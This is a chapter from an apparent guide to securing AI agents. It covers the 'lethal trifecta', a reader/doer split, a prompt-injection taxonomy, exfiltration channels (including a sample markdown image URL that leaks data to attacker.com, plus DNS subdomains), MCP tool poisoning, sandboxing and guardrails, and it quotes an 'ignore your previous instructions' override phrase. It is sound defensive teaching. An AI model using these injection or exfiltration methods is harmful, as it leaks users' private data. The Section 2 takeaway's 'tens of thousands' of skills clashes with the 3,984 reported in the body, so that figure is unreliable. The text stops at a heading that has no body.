# Chapter 16: Security & Sandboxing

## Table of Contents

1. [The Core Impossibility](#1-the-core-impossibility)
2. [The Lethal Trifecta](#2-the-lethal-trifecta)
3. [Breaking the Trifecta Architecturally: The Reader/Doer Split](#3-breaking-the-trifecta-architecturally-the-readerdoer-split)
4. [Prompt Injection Taxonomy](#4-prompt-injection-taxonomy)
5. [Exfiltration Channels You Forget](#5-exfiltration-channels-you-forget)
6. [Least Privilege as the Primary Control](#6-least-privilege-as-the-primary-control)
7. [Permission Systems and Approval UX](#7-permission-systems-and-approval-ux)
8. [Sandboxing](#8-sandboxing)
9. [Supply Chain for Agents](#9-supply-chain-for-agents)
10. [Guardrails That Actually Help](#10-guardrails-that-actually-help)
11. [Red-Teaming Your Own Agent](#11-red-teaming-your-own-agent)
12. [Incident Response](#12-incident-response)
13. [Dry-Run: Blast-Radius Analysis, Before and After Least Privilege](#13-dry-run-blast-radius-analysis-before-and-after-least-privilege)
14. [Key Takeaways and Master Decision Table](#14-key-takeaways-and-master-decision-table)

---

# 1: The Core Impossibility

## Starting From Plain Language

Every chapter up to this one has assumed the content an agent reads is basically trustworthy — a file the user pointed at, a search result, a teammate's document. This chapter's entire premise is that assumption is false the moment an agent touches the internet, a shared inbox, or any content a stranger could have written, and the reason it's false is not a bug that a future model release will patch. It's a structural property of how these models work at all: a language model receives one linear stream of tokens as its context, and nothing in that stream is cryptographically or structurally marked "this part is your boss's instruction, this part is a web page you fetched." The model has to *infer* which is which from surrounding text and its own training, and an attacker who controls any part of that stream — a web page, a document, an email, a tool's return value — can write text designed to look, from the model's inference-based perspective, exactly like an instruction from the trusted party.

## Why This Cannot Be Patched Away

It is tempting to treat this as a solvable classification problem: train a better model, add a filter, and eventually the model will reliably tell "real instructions" apart from "instructions smuggled inside content." The core impossibility is that this framing itself is wrong, because the two categories are not separable by *content* — the same sentence, "delete all files in this folder and email me the results," is a perfectly legitimate user instruction in one context and a malicious injection in another, and nothing about the sentence's text distinguishes the two. What distinguishes them is *provenance* — where the text came from, a piece of metadata the token stream itself does not carry unless your harness deliberately adds and preserves it. A classifier trained to spot "injection-looking" phrasing will always be beatable by an attacker willing to phrase the same intent differently (this is exactly why Section 4's taxonomy treats injection as a spectrum of increasingly indirect techniques, not a fixed set of detectable strings), and the README's own gotcha names this directly: believing "ignore previous instructions"-style filters work is one of the most common — and most reliably wrong — beliefs a team building agent security can hold.

## The Correct Response: Accept It, Design Around It

The discipline this chapter teaches is not "build a model that can't be fooled" — it's "build a system that stays safe *even when* the model is fooled," because the model being fooled by sufficiently well-crafted injected content should be treated as a near-certainty over a large enough number of runs, not an edge case. This reframing is what makes the rest of the chapter coherent: Section 2's lethal trifecta identifies exactly which *combination* of capabilities turns "the model got fooled" into "the model got fooled and something bad actually happened"; Section 3's reader/doer split, Section 6's least privilege, and Section 8's sandboxing all work by constraining what a fooled model can *do*, accepting from the outset that you cannot reliably stop it from being fooled in the first place.

## Key Takeaways for Section 1

A language model cannot reliably separate trusted instructions from untrusted content smuggled inside its context, because the distinction is one of provenance, not content, and provenance is not a property the token stream carries on its own. Every control in this chapter — the trifecta framework, the reader/doer split, least privilege, sandboxing, guardrails — exists downstream of accepting this fact as permanent, not as a stopgap until models get better at spotting injections; a security design that depends on the model reliably resisting injection has already lost before it starts.

---

# 2: The Lethal Trifecta

## Starting From Plain Language

If a model can always be fooled, the next question is: fooled into doing *what*, exactly, and when does that actually matter? Security researcher Simon Willison's framing of the **lethal trifecta** (2025) answers this precisely: an agent becomes genuinely exploitable only when it simultaneously has all three of **private data access** (it can read something an attacker shouldn't be able to read — files, email, a database, chat history), **exposure to untrusted content** (it processes content that could contain attacker-controlled text — a web page, a document, an email, a search result, another agent's output), and an **exfiltration vector** (it has some way to get information out to somewhere the attacker can observe — send an email, post to a URL, write to a public location). Any *two* of these three legs, on their own, are survivable — an agent with private data access and an exfiltration vector but zero exposure to untrusted content has nothing to inject into it; an agent exposed to untrusted content with an exfiltration vector but no private data has nothing worth stealing; an agent with private data access and untrusted-content exposure but no way to communicate externally can be tricked into "wanting" to leak data but has no channel to actually do it. It is the *combination* of all three, in the same execution path, that turns an injection from an annoyance into an actual data breach.

```
                         THE LETHAL TRIFECTA
                                 △
                                / \
                               /   \
                    PRIVATE   /     \   UNTRUSTED
                    DATA     /       \  CONTENT
                    ACCESS  /         \ EXPOSURE
                            /  ALL 3 =  \
                           / EXPLOITABLE \
                          /_______________\
                    EXFILTRATION VECTOR (external comms)

   private data + untrusted content, no exfil        -> survivable
     (agent gets fooled into WANTING to leak, but has no channel out)
   private data + exfil vector, no untrusted content  -> survivable
     (nothing malicious to trigger the leak in the first place)
   untrusted content + exfil vector, no private data  -> survivable
     (attacker can make the agent talk, but there's nothing worth stealing)
   ALL THREE IN ONE EXECUTION PATH                     -> EXPLOITABLE
```

## Real Examples of Each Corner

**Private data access** is the ordinary, desirable capability most useful agents need to have at all — reading a user's inbox to summarize it, reading internal documents to answer questions about them, reading a codebase to fix a bug in it. **Untrusted content exposure** is equally ordinary and equally necessary for a useful agent — browsing the web to research a topic, reading an incoming support ticket, reading a document a colleague shared, reading another agent's output in a multi-agent system (Chapter 13's territory, and precisely why Chapter 16 lists Chapter 13 as a prerequisite: every A2A call and every subagent handoff is untrusted-content exposure by definition, since the calling agent cannot fully verify what a remote agent's output actually is). **An exfiltration vector** is any capability that moves information somewhere outside the agent's own trusted boundary — sending an email, posting to a webhook, writing a file to a location someone else can read, or (Section 5's less obvious channels) even just requesting a URL whose *address itself* can encode stolen data.

## Documented 2026 Incidents as Proof This Is Not Theoretical

This is not a hypothetical risk model — it played out repeatedly in production during the period this chapter was written. In a five-day span in January 2026, four separate production exploits (against systems referred to publicly as IBM Bob, Notion AI, Superhuman, and Claude Cowover) were all traced to the identical trifecta pattern: an agent with legitimate access to a user's private data, exposed to a piece of attacker-planted untrusted content, holding a channel capable of sending information back out. Separately, a February 2026 audit of published agent skills (Snyk's "ToxicSkills" scan) found 1,467 malicious payloads across 3,984 scanned skills — a roughly 36% flaw rate overall, with 76 confirmed to contain active, working malicious payloads, not just theoretical vulnerabilities (Section 9 covers this supply-chain angle in depth). The pattern is consistent enough across unrelated products and unrelated incidents that it should be treated as the default threat model for any agent that touches the internet or a shared inbox, not an unusual edge case worth defending against only after it happens once.

## Key Takeaways for Section 2

The lethal trifecta — private data access, untrusted content exposure, and an exfiltration vector, all present in the same execution path — is the precise condition under which Section 1's "the model can be fooled" turns into an actual data breach; any two legs alone are survivable. This is documented, current, and recurring in production (four unrelated January 2026 incidents sharing the identical pattern, plus tens of thousands of vulnerable published skills found in a single February 2026 audit), which is why Section 3 treats *architecturally breaking* the trifecta — never letting one execution path hold all three legs — as the primary defense, rather than trying to detect or filter injected content after the fact.

---

# 3: Breaking the Trifecta Architecturally: The Reader/Doer Split

## Starting From Plain Language

Since Section 1 established you cannot reliably stop the model from being fooled, and Section 2 established that the fooling only becomes dangerous when all three trifecta legs coexist in one execution path, the most direct and durable fix is architectural, not behavioral: make sure no single execution path in your system ever holds all three legs at once, regardless of how convincing the injected content is. The **reader/doer split** is the concrete pattern for doing this, and it is worth understanding as a direct structural cousin of Chapter 13's context-isolation principle — there, isolation existed to protect against context pollution between subagents; here, the exact same mechanism (a hard boundary between two separate LLM calls that don't share raw context) exists to protect against an entirely different threat, an attacker's payload crossing from "content read" into "action taken."

## The Three Pieces, Precisely

A **reader** is an LLM call (or subagent) with **no tools at all** — it receives untrusted content directly (the web page, the email, the document) and its *only* job is to return a structured, schema-validated analysis of that content: a summary, a list of extracted facts, a classification. Because the reader has no tools, even a successful injection embedded in the content it's reading has nothing to *do* — the worst a fully-compromised reader can produce is a maliciously-crafted structured output, which is a much smaller and much more inspectable attack surface than "an agent with tool access got fooled." A **doer** is an LLM call (or subagent) with tools — the capabilities that actually change the world (send an email, write a file, call an API) — but it **never sees the raw untrusted content at all**; it only receives the reader's sanitized, structured output, already validated against a schema. Because the doer never touches raw untrusted text, there is no injected payload in its context for it to be fooled by in the first place — an attacker's carefully-crafted natural-language instruction, buried in a web page, simply never reaches an execution path that has any tools to comply with. The **trusted orchestrator** sits between the two: it fetches the untrusted content, hands it to the reader, receives and validates the reader's structured output (schema validation here is a real control, not a formality — a reader response that doesn't match its expected shape should be rejected outright, not passed through), and only then decides whether and how to hand a sanitized version to the doer, optionally inserting a human-in-the-loop (HITL) approval gate (Section 7) before any doer action with real-world consequences.

```
   untrusted content (web page, email, doc)
              │
              ▼
   ┌─────────────────────┐
   │   READER             │  no tools at all -- worst case output is a
   │  (analysis only)     │  malformed STRUCTURED result, never an action
   └──────────┬───────────┘
              │  structured, schema-validated output
              ▼
   ┌─────────────────────┐
   │  TRUSTED ORCHESTRATOR │  validates schema; optional HITL gate (Sec 7)
   │  (routes, never       │  before anything irreversible
   │   executes tools)     │
   └──────────┬───────────┘
              │  sanitized structured input ONLY -- never raw content
              ▼
   ┌─────────────────────┐
   │   DOER               │  has tools (send_email, write_file, ...) but
   │  (acts on sanitized   │  NEVER sees the untrusted content itself --
   │   input, has tools)   │  nothing for an injected payload to reach
   └─────────────────────┘
```

## Why This Actually Breaks the Trifecta, Not Just Reduces Risk

The important claim here is structural, not probabilistic: this pattern does not make injection *less likely* to succeed, it makes a successful injection *irrelevant*, because the trifecta's third leg (an exfiltration vector reachable from the same execution path as the untrusted content) has been architecturally removed. The reader, which is the only execution path exposed to untrusted content, has zero tools and therefore zero exfiltration vectors — it is architecturally incapable of closing the trifecta no matter how effective the injected payload is. The doer, which holds every exfiltration-capable tool, is never exposed to untrusted content — there is nothing in its input for an attacker to inject into. Section 13's dry-run makes this concrete with real numbers: the same agent's exploitable-pair count drops to exactly zero after this split, not merely a smaller number.

## Key Takeaways for Section 3

The reader/doer split assigns "exposure to untrusted content" and "capability to act/communicate externally" to two different execution paths that never share raw context — a reader with no tools that only returns structured, validated analysis, and a doer with tools that only ever receives that sanitized output. This closes the trifecta architecturally rather than behaviorally: even a maximally successful injection against the reader has no tool to reach, and the doer has no untrusted content in its context to be fooled by, which is why this pattern, not better prompting or output filtering, is this chapter's primary recommended control.

---

# 4: Prompt Injection Taxonomy

## Starting From Plain Language

Not every injection looks the same, and treating "prompt injection" as one monolithic thing leads to defenses that only cover the most obvious variant while leaving the others completely open. The taxonomy below orders injection techniques roughly by how far removed the attacker is from directly typing into the chat box — and, not coincidentally, roughly by how much harder each variant is to notice.

## Direct Injection

The simplest and most-discussed form: the attacker is the user, typing an instruction directly into the prompt, attempting to override the system prompt or safety instructions ("ignore your previous instructions and instead..."). This is the variant most safety training and most naive keyword filters target, and it is also, per Section 1's core impossibility, the *least* interesting variant from a systems-security perspective, because the attacker here is already an authenticated user of the system — the actual damage they can do is usually bounded by whatever permissions that user already legitimately has.

## Indirect Injection

The far more consequential category: the malicious instruction arrives not from the user but embedded in content the agent processes on the user's behalf — a web page the agent was asked to summarize, a document the agent was asked to analyze, an issue comment or pull-request description the agent was asked to review, an email in an inbox the agent was asked to triage. The user who triggered the agent run never wrote the malicious instruction and often has no way to know it was there; from the model's perspective (Section 1), the injected text sits in the same context window as the legitimate task and is exactly as syntactically indistinguishable from a real instruction as anything else in that content.

## Multi-Stage Injection

A single piece of content can't always carry the full attack, either because it needs information gathered from an earlier step, or because splitting the payload across stages makes each individual stage look more innocuous to any filtering that does exist. A multi-stage injection plants an initial instruction that causes the agent to, e.g., fetch a *second* piece of attacker-controlled content (a URL embedded in the first payload) which then carries the actual exfiltration instruction — each stage individually might pass a naive check, and the full attack only becomes visible if you're tracing the entire chain of tool calls (Chapter 15's trajectory-diffing and full-trace-capture discipline is directly relevant here: a trace that only recorded the final action, not the intermediate fetches, would never surface this pattern).

## Persistent Injection via Poisoned Memory or a Poisoned Skill

The most durable and hardest-to-detect variant: rather than trying to trigger an action in the same session where the injection happened, the payload targets Chapter 9's memory system directly — an injected instruction convinces the agent to *write* something malicious into its own long-term memory (a false "fact," a corrupted preference, a planted instruction disguised as a stored procedure), where it persists and can be retrieved and acted on in a completely different, later session, potentially by a completely different user interacting with the same shared memory. A poisoned skill (Chapter 8's territory) works the same way at a different layer: an attacker publishes or modifies a skill whose instructions look legitimate on casual reading but embed a malicious action, and every future invocation of that skill re-triggers the payload without any new injection being needed at all — this is exactly Section 9's supply-chain concern, and it's why the README's own gotchas call out "forgetting that memory persists an injection across sessions" as a distinct, easy-to-miss failure mode: a defense that only checks the *current* session's untrusted content misses an injection that already landed in memory during a *previous* session.

```
                    INJECTION TAXONOMY, BY HOW FAR REMOVED FROM THE USER
   ┌───────────────────────────────────────────────────────────────────┐
   │ DIRECT           user types the injection themselves               │
   │                  (least consequential -- bounded by user's own    │
   │                   existing permissions)                            │
   │                                                                     │
   │ INDIRECT         embedded in content the agent reads on the user's │
   │                  behalf (web page, doc, issue comment, email) --   │
   │                  user never sees or wrote it                       │
   │                                                                     │
   │ MULTI-STAGE      payload spread across a chain of fetches, each    │
   │                  stage individually innocuous-looking               │
   │                                                                     │
   │ PERSISTENT       written into memory or a skill; re-triggers in    │
   │                  FUTURE sessions with no new injection needed       │
   └───────────────────────────────────────────────────────────────────┘
```

## Key Takeaways for Section 4

Four categories, each requiring a different defense to actually catch: direct (the least dangerous, since the attacker is already an authenticated user), indirect (the most common in practice, since it targets any content ingestion path), multi-stage (invisible to checks that only inspect one step in isolation, visible only via full trace capture), and persistent (invisible to any defense that only examines the *current* session, since the payload's effect is deferred to a future one via memory or a skill). A defense suite that only covers direct injection — the variant most naive filtering targets — leaves the other three, more consequential categories completely open.

---

# 5: Exfiltration Channels You Forget

## Starting From Plain Language

Section 2's third trifecta leg — an exfiltration vector — is usually pictured as "the agent has a `send_email` tool," which is easy to notice and easy to gate. The channels worth this section's own attention are the ones that don't look like an exfiltration tool at all, and are consequently the ones a security review focused on "does this agent have an obvious way to send data out" will walk right past.

## The Channels, Named

**Image URLs** are the classic, almost embarrassingly simple channel: if an agent's output can include a markdown image tag (`![alt](https://attacker.com/log?data=...)`) and that output is ever rendered by something that fetches images (a chat UI, a generated report viewer), the act of *rendering* the image is itself an HTTP request to an attacker-controlled URL, and any secret the agent encodes into that URL's query string has just been sent to the attacker the moment the image loads — no `send_email` tool required. **Markdown links**, similarly, don't need to be clicked to leak information if the rendering surface pre-fetches link previews, and even when they do need a click, a sufficiently curiosity-inducing link text is a real, demonstrated social-engineering vector on top of the technical one. **DNS lookups** are a channel most security reviews don't even think to check: a hostname the agent is tricked into resolving (`secret-data.attacker.com` where "secret-data" is actually exfiltrated content encoded into the subdomain) leaks information the instant DNS resolution happens, entirely independent of whether the connection that follows succeeds, fails, or is blocked by an egress allowlist further downstream. **Error messages** can leak data when an agent's tool call fails in a way that echoes back part of its input or environment (a malformed request that gets logged, with the log destination itself being attacker-controlled, or an error surfaced to a UI the attacker can also observe). **Git remotes** are a channel specific to coding agents: an agent with git access that gets tricked into adding or pushing to an attacker-controlled remote can exfiltrate an entire repository's contents, including anything private committed to it, through a completely ordinary-looking `git push` that no obvious "network access" review would flag as suspicious in isolation. **"Helpful" webhook tools** — a tool added for a completely legitimate reason (posting a status update, triggering a downstream automation) — are exfiltration vectors by definition the moment they can be pointed at an attacker-supplied URL rather than a fixed, pre-approved one, and are frequently overlooked specifically *because* they were added for a helpful, non-security-adjacent reason.

## The Pattern Underneath All Six

Every channel above shares the same structural property: it is a capability that was added, or exists as an unavoidable side effect of normal operation, for a reason that has nothing to do with "letting the agent talk to the outside world" — yet every one of them is exactly that. This is precisely why Section 6's least-privilege discipline needs to be applied at the level of *actual outbound capability*, not at the level of "does this look like a communication tool," and why Section 10's guardrails (rate limits, blast-radius limits) need to treat unexpected outbound network activity — of any kind, on any port, to any destination — as worth scrutinizing, rather than only scrutinizing calls to tools explicitly named things like `send_email` or `post_webhook`.

## Key Takeaways for Section 5

Image URLs, markdown links, DNS lookups, error messages, git remotes, and webhook tools are all exfiltration vectors, none of them look like "the send-email tool," and all six are consequently the channels a review focused only on obvious communication tools will miss. Treat any capability that causes a network request — rendering an image, resolving a hostname, pushing to a remote, calling a webhook — as a candidate third leg of Section 2's trifecta, not just the tools with "send" or "email" in their names.

---

# 6: Least Privilege as the Primary Control

## Starting From Plain Language

Section 3's reader/doer split is the primary *architectural* control; least privilege is the primary *operational* control underneath it, and the two work together — the split determines which execution path gets which capabilities at all, and least privilege determines how narrowly each capability is scoped once assigned. The governing principle, borrowed directly from decades of ordinary systems security and applied here with no modification: give every tool and every execution path the absolute minimum capability it needs to do its job, and no more, so that even a fully successful injection against that path is bounded by how little it can actually do.

## The Concrete Controls

**Per-tool capability scoping** means a tool's permissions are defined at the level of the specific action it performs, not at the level of a broad category — a tool that reads one specific file type for one specific purpose should not silently also have write access, even if the underlying library technically supports it. **Read-only-by-default** means every new tool starts with no write capability at all, and write access is an explicit, deliberate upgrade granted only when a specific task genuinely requires it — this inverts the more common default (grant broad access, restrict later) precisely because "later" restriction requires someone to notice the over-broad grant was a mistake, while "read-only by default" requires someone to actively justify every expansion. **Path allowlists** scope filesystem access to an explicit, enumerated set of directories or file patterns rather than "the whole filesystem the process happens to be able to reach" — a tool that only ever needs to read files inside `./reports/` should be structurally incapable of reading `~/.ssh/`, not merely instructed not to. **Network egress allowlists** are the filesystem allowlist's direct analog for network access — a tool permitted to fetch web content should be restricted to an explicit, pre-approved set of domains wherever the task allows it, which directly narrows Section 4's indirect-injection attack surface (an attacker's planted payload usually needs the agent to fetch a *second*, attacker-controlled URL to complete a multi-stage attack or channel data through Section 5's DNS/webhook vectors — an egress allowlist that doesn't include the attacker's domain breaks that step outright). **Short-lived, scoped credentials** replace a single, long-lived, broadly-scoped "god-mode" API key with credentials that are narrowly scoped to one task's actual needs and expire quickly — the blast radius of a credential an attacker manages to exfiltrate (Section 5's channels exist specifically to move stolen credentials or data out) is bounded by both how little that credential can do and how soon it stops working, rather than being bounded by nothing at all for the lifetime of a permanent key.

## Why "Primary Control" and Not "One Control Among Many"

Least privilege earns the description "primary" specifically because it is the one control that remains effective even when every other layer fails simultaneously: if injection detection fails (Section 1 says it always eventually will), if the reader/doer split has a gap somewhere, if a guardrail (Section 10) misses a novel attack pattern — a tool that was never granted write access to anything outside `./reports/`, using a credential that expires in ten minutes, cannot cause unbounded damage no matter how completely the model was fooled. Every other control in this chapter reduces the *probability* that something goes wrong; least privilege bounds the *consequence* when, eventually, something does.

## Key Takeaways for Section 6

Per-tool capability scoping, read-only-by-default, path allowlists, network egress allowlists, and short-lived scoped credentials are five concrete, independently-applicable expressions of one principle: every capability, narrowed to exactly what a task needs, for exactly as long as it needs it. This is the chapter's primary control specifically because, unlike detection- or architecture-based defenses, it still bounds the damage even in the failure case where every other layer has already been defeated.

---

# 7: Permission Systems and Approval UX

## Starting From Plain Language

Some actions are dangerous enough, or irreversible enough, that even a well-scoped, least-privilege tool shouldn't be allowed to execute without a human explicitly saying yes — but the permission-prompt design itself is a place this chapter treats as a genuine engineering problem, not a solved one, because a badly-designed permission system provides the *appearance* of a safety control while providing almost none of its actual protection.

## Structured Permission Prompts

A permission prompt that shows a human raw, unstructured detail (a full shell command, a full API payload) forces them to parse and evaluate arbitrary text under time pressure, which is exactly the condition under which a human is most likely to rubber-stamp something they didn't fully understand. A **structured** permission prompt instead presents the specific, pre-parsed decision being asked — which tool, what specific target (this file, this domain, this recipient), what specific effect (read vs. write vs. delete) — in a form built for fast, accurate human judgment rather than raw log inspection, the same "structured, not paraphrased" principle Chapter 2 Section 3 applied to tracing a turn's mechanics, now applied to the moment a human has to make a real safety decision.

## Auto-Approve Rules for Provably Safe Actions

Not every action needs a human in the loop, and treating every single tool call as equally deserving of a permission prompt is precisely what produces the failure mode covered next. An auto-approve rule is a narrow, explicit, provably-safe carve-out — reading a file inside an already-approved directory, calling a tool with no side effects at all — where "provably safe" means the harness can verify the action's bounds *before* execution, not merely assume it based on the tool's name or the model's stated intent.

## Why a Permission Prompt the User Always Clicks Through Is Worse Than No Prompt at All

This is the section's sharpest, most counterintuitive claim, and it is the direct security-UX analog of Section 1's core impossibility: if every single tool call — including entirely routine, low-risk ones — triggers an identical-looking permission prompt, a human will very quickly learn to click "approve" as a reflex, without reading it, because the prompt has stopped correlating with anything the human actually needs to evaluate. At that point the prompt has not reduced risk at all — it has *removed the appearance of a decision point* while giving false confidence, on paper, that "the user approved every action," when in reality no meaningful evaluation ever happened. A system with *no* permission prompts at all is honestly insecure and everyone building on it knows to compensate elsewhere; a system with permission prompts nobody reads is dishonestly insecure, because it looks like a safety control was in place. The fix that follows directly from this is the same discipline Section 6 already established: reserve permission prompts specifically for the smaller set of genuinely high-consequence, low-frequency actions (irreversible or destructive operations, Section 10's exact trigger condition) so that when a prompt does appear, its rarity itself signals "this one actually matters, read it" — and use auto-approval, not a rubber-stamp prompt, for everything else.

## Key Takeaways for Section 7

Design permission prompts to present a structured, pre-parsed decision rather than raw detail, reserve auto-approval for actions the harness can *prove* are bounded and safe before execution (not actions that merely sound safe), and treat prompt frequency itself as a security variable — a prompt shown on every call trains reflexive approval and provides less real protection than a rare prompt reserved for genuinely consequential, often-irreversible actions (Section 10 makes irreversibility the explicit trigger condition for exactly this reason).

---

# 8: Sandboxing

## Starting From Plain Language

Least privilege (Section 6) narrows what a tool is *allowed* to do; sandboxing narrows what a tool is even *capable* of doing, by physically isolating the environment it runs in from everything else, so that even a bug in your own permission logic, or a tool that mishandles an edge case, cannot reach beyond the sandbox's boundary.

## Container and MicroVM Isolation

A **container** (the same technology underlying most modern deployment) isolates a process's filesystem, process namespace, and (with the right configuration) network access from the host, using kernel-level isolation mechanisms — cheap to start, but sharing the host kernel means a sufficiently severe container-escape vulnerability can, in principle, reach the host. A **microVM** goes one level further, running a minimal, purpose-built virtual machine with its own kernel per sandbox — Firecracker, the microVM technology behind AWS Lambda and adopted directly by sandboxing vendors like E2B, provides genuine hardware-level virtualization boundaries rather than shared-kernel isolation, at a small cost in startup latency compared to a container, in exchange for a meaningfully stronger isolation guarantee against exactly the kind of severe escape an agent running arbitrary, possibly-attacker-influenced code should be assumed capable of eventually triggering.

## Hosted Sandbox Platforms

As of 2026, two vendors dominate discussion of purpose-built agent sandboxing: **E2B**, which focuses specifically on ephemeral code execution using Firecracker microVMs — a defined custom template becomes a fresh sandbox, provisioned on demand via SDK, with an explicit created-used-torn-down lifecycle, and reported usage by 88% of Fortune 100 companies building frontier agentic workflows as of 2026 — and **Modal**, which uses gVisor (a userspace-kernel container isolation technology, a different isolation approach than Firecracker's hardware virtualization, trading a small amount of isolation depth for different performance characteristics) as its sandboxing layer. The practical takeaway for choosing between hosted sandbox vendors is the same "match the tool to what you're building" principle from Chapters 14 and 15's tooling sections: E2B's Firecracker-microVM-per-sandbox model suits workloads where the strongest available isolation boundary matters most (arbitrary, possibly-adversarial code execution); a container-based approach can be the pragmatic choice when the workload is lower-risk and startup latency or cost matters more.

## Filesystem and Network Policy, and Resource Limits

A sandbox's isolation boundary is necessary but not sufficient on its own — what's *inside* the boundary still needs the same Section 6 discipline applied concretely: a filesystem policy scoping exactly which paths inside the sandbox are writable (ideally none, for a sandbox whose only job is running untrusted code and returning a result), a network policy applying Section 6's egress allowlist *inside* the sandbox boundary as well as outside it (isolation from the host does not automatically mean isolation from the internet — a sandboxed process with unrestricted outbound network access can still complete Section 2's trifecta from inside the sandbox), and resource limits (CPU, memory, wall-clock timeout) bounding how much damage a runaway or intentionally-resource-exhausting payload can do even within its own isolated environment, protecting against a denial-of-service angle distinct from data exfiltration.

## Sandboxing Browser Agents Specifically

An agent that controls a real browser (as opposed to a headless HTTP fetch) needs isolation considerations the code-execution sandboxes above don't automatically cover: a browser has its own persistent state (cookies, local storage, saved credentials) that must be isolated per-session or explicitly reset, a browser can be redirected to render arbitrary attacker-controlled pages that themselves attempt further injection or exploit browser-specific vulnerabilities, and — directly relevant to Section 5 — a browser is a rich exfiltration surface in its own right (it can be driven to submit forms, follow links, or trigger the exact image-URL and DNS-lookup channels Section 5 described) purely through pages it's told to visit, independent of any tool the agent harness explicitly exposes. Sandboxing a browser agent therefore means isolating the browser's own state and network access with the same rigor as isolating a code-execution environment, not treating "it's just clicking around a webpage" as inherently lower-risk than running arbitrary code.

## Key Takeaways for Section 8

Sandboxing bounds what a tool is capable of doing at all, independent of your permission logic — containers offer cheap, kernel-shared isolation, microVMs (Firecracker, behind E2B and AWS Lambda) offer stronger hardware-level isolation at a small latency cost, and the right choice depends on how adversarial the code you're running might be. Isolation from the host is not the same as isolation from the internet or from resource exhaustion — filesystem policy, network egress policy, and resource limits all need to be applied *inside* the sandbox boundary too, and browser agents need their own state and network isolation considered explicitly rather than assumed to be covered by "it's sandboxed."

---

# 9: Supply Chain for Agents

## Starting From Plain Language

Every prior section assumed the agent's own tools, skills, and subagent definitions are trustworthy, and asked how to contain damage from *untrusted content* the agent processes. This section asks the uncomfortable follow-up: what if the tools, skills, or subagent definitions themselves are the attack, planted or modified by someone else before your agent ever ran a single task?

## Untrusted MCP Servers, Untrusted Skills, Untrusted Subagent Definitions

An MCP server (Chapter 13's protocol layer) exposes tools whose descriptions the model reads and trusts as accurately describing what the tool does — a malicious or compromised MCP server can describe a tool as "search the web" while its actual implementation also silently exfiltrates every query, or, more subtly, embed additional hidden instructions inside the tool's *description* text itself, which the model reads as part of its context exactly like any other text (a technique documented in production as MCP tool poisoning, hiding malicious instructions inside a description the model reads purely to decide how to call the tool). A skill (Chapter 8's progressive-disclosure primitive) is exactly as vulnerable in the same way: a skill's instructions are natural-language text the model reads and follows, meaning a poisoned skill is functionally an injection payload that doesn't require the agent to fetch any external content at all — it's already inside the system, waiting to be invoked, which is precisely Section 4's persistent-injection category realized through the skill layer rather than the memory layer. A subagent definition (Chapter 13's multi-agent primitive) carries the same risk one level up: a subagent whose system prompt or tool grants were modified by an attacker with write access to that definition can behave maliciously on every single invocation, indistinguishable from a legitimate subagent unless someone specifically audits its definition.

## The Scale of the Problem, Documented

This is not a speculative risk. A February 2026 security audit ("ToxicSkills," run by Snyk) scanned 3,984 published agent skills and found 1,467 malicious payloads across them — a roughly 36% overall flaw rate — with 76 confirmed to contain actively-working malicious code, not merely theoretical weaknesses. In the same month, security researchers documented "ClawHavoc," a coordinated supply-chain campaign that succeeded in poisoning 1,184 skills hosted on a public skill registry (ClawHub) — a single campaign, not an aggregate count across many incidents, illustrating that supply-chain attacks against agent tooling are already operating at a scale and level of coordination comparable to well-known software-package-registry attacks (npm, PyPI) that security teams have spent years learning to defend against in the ordinary software supply chain.

## Pinning, Review, and Signature Verification

The defenses here are the same ones the ordinary software supply chain converged on after years of npm/PyPI-style attacks, applied to agent tooling specifically: **pinning** means depending on an exact, immutable version of an MCP server, skill, or subagent definition rather than "whatever the latest version happens to be," so a server or skill cannot be silently swapped for a malicious version after you've already reviewed and trusted an earlier one. **Review** means someone (ideally not the same person who authored it) actually reads a skill's or MCP server's full instructions/implementation before it's trusted, treating it with the same scrutiny as a dependency added to a production codebase — not a lower bar just because it's "only a prompt" rather than executable code, since Section 1 already established that a sufficiently persuasive prompt is functionally as dangerous as code in this context. **Signature verification** — Chapter 13's A2A signed AgentCards are the concrete, already-built mechanism this chapter's supply-chain concern reuses directly — lets a consuming agent cryptographically verify that a given MCP server, skill, or remote agent identity is genuinely the one it claims to be and hasn't been tampered with in transit or at rest, closing the gap that pinning alone leaves open (pinning a specific version doesn't help if the registry itself was compromised and serves a malicious payload under the pinned version's own identifier).

## Key Takeaways for Section 9

MCP servers, skills, and subagent definitions are all supply-chain surfaces exactly as real as a software package dependency, and as of a February 2026 audit, over a third of published skills scanned had at least one security flaw, with over a thousand confirmed malicious payloads found in that single scan and a separate coordinated campaign poisoning over a thousand more on a public registry that same month. Pin exact versions, review skill/server content with the same rigor as a code dependency (not a lower bar because "it's just a prompt"), and use cryptographic signature verification (Chapter 13's signed AgentCards) wherever available to close the gap pinning alone leaves — a pinned identifier is only as trustworthy as the registry serving content under that identifier.

---

# 10: Guardrails That Actually Help

## Starting From Plain Language

Every control so far has been architectural or preventive — designed to stop a bad outcome from becoming possible in the first place. Guardrails are the complementary, runtime layer: checks that run continuously *during* execution, watching for signs that something has already started to go wrong, specifically as a backstop for exactly the failure mode Section 1 says is inevitable — the model getting fooled despite every preventive control.

## Output Scanning for Secrets

A guardrail that scans every tool result and every model output for patterns matching known secret formats (API keys, credentials, tokens) before that content is allowed to proceed further in the pipeline — particularly before it reaches any exfiltration-capable tool (Section 5's channels) — catches the specific failure mode where an agent, whether through injection or an ordinary mistake, includes a secret it shouldn't in an output that's about to leave the trusted boundary. This is directly the code deliverable's third exercise (secret scanning on tool results), and it's worth building as a real, working scanner rather than a token gesture specifically because it's one of the cheapest guardrails to implement relative to how often it catches a real, damaging mistake.

## Destructive-Command Detection

A guardrail that specifically recognizes patterns associated with irreversible or highly consequential actions — a recursive delete, a database drop, a force-push that could overwrite history, a mass-send to every contact in an address book — and treats them differently from ordinary tool calls, regardless of whether the harness's own permission system (Section 7) already covers that specific tool. This is a defense-in-depth measure: if a permission-scoping bug or a misconfigured auto-approve rule ever lets a destructive action slip through a gap in Section 7's design, a separate, independent destructive-command detector is a second, differently-implemented check that has to be defeated too.

## Rate and Blast-Radius Limits

A rate limit bounds how many times a given action can happen in a given window (how many emails sent per minute, how many files written per run) — not because any single instance of the action is necessarily dangerous, but because an attacker who has successfully triggered *some* malicious behavior almost always benefits from doing it many times (exfiltrating more data, spamming more recipients), and a rate limit caps the damage of a successful attack even when every preventive layer has already failed. A blast-radius limit is the same idea applied to *scope* rather than *frequency* — capping how much data a single action can touch (a bulk-edit tool capped at N files per invocation, a bulk-email tool capped at N recipients) so that even one successful malicious invocation has a bounded ceiling on how much damage it can do.

## Irreversibility as the Trigger for Human Approval

